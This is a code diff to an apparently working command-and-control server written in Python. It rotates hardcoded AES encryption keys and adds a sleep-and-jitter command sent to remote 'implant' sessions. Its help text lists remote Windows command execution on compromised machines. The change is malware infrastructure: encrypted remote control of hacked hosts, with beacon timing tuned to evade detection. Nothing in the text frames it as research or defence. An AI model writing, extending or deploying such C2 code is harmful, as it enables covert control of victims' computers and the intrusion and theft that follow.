@@ -10,8 +10,8 @@ from Crypto.Util.Padding import pad, unpad
 from prompt_toolkit import PromptSession
 from prompt_toolkit.patch_stdout import patch_stdout
 
-KEY = b"\xa1\xfc\x5b\xf2\x70\xce\x33\x60\x63\x83\xc0\xa6\xe8\x4b\xbd\x54"
-IV  = b"\xbc\x9d\xbd\xfa\xe8\xbf\x08\x93\xaa\xeb\xe8\x2a\x79\x65\x77\x8b"
+KEY = b"\xfe\x72\x43\xc2\xc3\x82\x7d\x63\x7e\x6e\xd6\xcd\xc8\x57\x0f\x8d\xe2\xf4\x12\x04\x97\x7a\x2b\x89\x43\x8a\xcf\x7d\x88\x35\xb5\x9d"
+IV  = b"\x2a\xdf\xfa\x9d\xe4\x6a\x0e\xf8\xe7\xea\x34\x7e\xf9\x8c\xc5\xee"
 
 log_dir = "stage0_logs"
 os.makedirs(log_dir, exist_ok=True)
@@ -85,6 +85,7 @@ Local commands:
   use <session_id>    Switch operator control to another session
   kill <session_id>   Forcibly close a session
   exit                Exit the current session (send EXIT to implant)
+  sleep <s> <jitter>  Set sleep (seconds) and jitter (%) for the selected implant
 
 Remote commands:
   CMD <command>        Run a Windows command (e.g., CMD whoami)
@@ -165,6 +166,24 @@ def operator_loop():
                     selected_session = None
                 else:
                     print("[!] No session selected.")
+            elif cmd.lower().startswith("sleep "):
+                # Send sleep command to implant
+                if not selected_session:
+                    print("[!] No session selected. Use sessions and use <session_id>.")
+                    continue
+                sid = selected_session
+                with sessions_lock:
+                    if sid not in sessions or sessions[sid]['status'] != 'active':
+                        print(f"[!] Session {sid} not found or not active.")
+                        continue
+                    sock = sessions[sid]['sock']
+                try:
+                    encrypted = encrypt_msg(cmd + "\n")
+                    payload = base64.b64encode(encrypted) + b"\n"
+                    sock.send(payload)
+                    log(sid, f"[SENT] {cmd}")
+                except Exception as e:
+                    print(f"[!] Error sending command: {e}")
             else:
                 # Send command to selected session
                 if not selected_session:
